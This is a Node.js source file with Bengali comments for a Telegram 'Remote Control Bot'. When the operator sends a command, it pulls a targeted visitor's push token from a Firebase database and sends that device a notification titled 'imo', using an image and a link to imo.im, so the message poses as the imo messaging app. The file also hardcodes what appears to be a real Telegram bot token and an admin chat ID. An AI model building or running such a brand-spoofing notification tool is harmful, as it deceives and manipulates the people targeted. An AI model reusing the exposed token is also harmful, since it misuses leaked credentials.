const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');

// আপনার দেওয়া বট টোকেন
const token = '8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA';

// ফায়ারবেস অ্যাডমিন কানেকশন (গিটহাব সিক্রেট থেকে আসবে)
const serviceAccount = require('./serviceAccountKey.json');

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  // আপনার দেওয়া ডাটাবেস লিংক
  databaseURL: "https://my-sc-tools-default-rtdb.firebaseio.com"
});

const db = admin.database();
const bot = new TelegramBot(token, {polling: true});
const ADMIN_CHAT_ID = '8271536101'; // আপনার চ্যাট আইডি

console.log("🔥 Remote Control Bot is Online...");
bot.sendMessage(ADMIN_CHAT_ID, "✅ System Started. Ready for commands!");

// কমান্ড: /4545 send sms Hello World
bot.onText(/\/(\d+) (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetId = match[1];
  const command = match[2];
  
  const messageBody = command.replace('send sms ', '');

  bot.sendMessage(chatId, `📡 Targeting User: ${targetId}...`);

  try {
    // আপনার ডাটাবেসের visitors পাথ থেকে টোকেন নেওয়া হচ্ছে
    const snapshot = await db.ref(`visitors/v_${targetId}/pushToken`).once('value');
    const userToken = snapshot.val();

    if (!userToken) {
      bot.sendMessage(chatId, `🚫 Target [${targetId}] not found or No Permission given!`);
      return;
    }

    const payload = {
      token: userToken,
      notification: {
        title: "imo",
        body: messageBody,
        image: "https://i.ibb.co/v6m80kP/nusrat.jpg"
      },
      data: {
        click_action: "FLUTTER_NOTIFICATION_CLICK",
        url: "https://imo.im"
      }
    };

    await admin.messaging().send(payload);
    bot.sendMessage(chatId, `✅ Notification Sent to [${targetId}]: "${messageBody}"`);

  } catch (error) {
    bot.sendMessage(chatId, `⚠️ Error: ${error.message}`);
  }
});
